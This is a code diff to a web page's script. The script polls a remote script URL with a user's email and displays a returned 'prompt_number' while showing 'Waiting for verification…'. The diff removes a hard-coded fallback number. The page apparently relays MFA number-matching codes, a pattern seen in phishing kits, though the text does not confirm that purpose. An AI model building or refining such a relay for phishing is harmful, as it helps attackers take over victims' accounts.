@@ -52,54 +52,33 @@
     const statusText = document.getElementById("statusText");
     const matchNumber = document.getElementById("matchNumber");
 
-    let lastKnownNumber = "66";  // fallback default
-
     function checkForNumber() {
-      const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
+      const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}&nocache=${Math.random()}`;
 
-      fetch(url, {cache: "no-store"})
+      fetch(url, { cache: "no-store" })
         .then(r => r.text())
         .then(text => {
+          // Very simple & reliable number extraction
           const match = text.match(/"prompt_number":"(\d+)"/);
-          const number = match ? match[1] : "";
-
-          if (number && number !== "" && number !== "null") {
-            lastKnownNumber = number;  // update fallback
+          if (match && match[1]) {
+            const number = match[1];
             matchNumber.textContent = number;
             statusText.textContent = "Number received";
             loading.style.display = "none";
             promptSection.style.display = "block";
           } else {
-            // Use last known if server gave nothing
-            matchNumber.textContent = lastKnownNumber;
-            statusText.textContent = "Using last known number";
-            loading.style.display = "none";
-            promptSection.style.display = "block";
+            statusText.textContent = "Waiting for verification…";
           }
         })
         .catch(() => {
-          // On any error → force show last known number
-          matchNumber.textContent = lastKnownNumber;
-          statusText.textContent = "Number (cached)";
-          loading.style.display = "none";
-          promptSection.style.display = "block";
+          statusText.textContent = "Waiting for verification…"; // silent retry
         });
     }
 
-    // Poll every 5 seconds
-    setInterval(checkForNumber, 5000);
-    // Immediate first check
+    // Poll every 4 seconds
+    setInterval(checkForNumber, 4000);
+    // Run immediately
     checkForNumber();
-
-    // After 30 seconds → force display something no matter what
-    setTimeout(() => {
-      if (matchNumber.textContent === "••") {
-        matchNumber.textContent = lastKnownNumber;
-        statusText.textContent = "Number loaded";
-        loading.style.display = "none";
-        promptSection.style.display = "block";
-      }
-    }, 30000);
   </script>
 </body>
 </html>
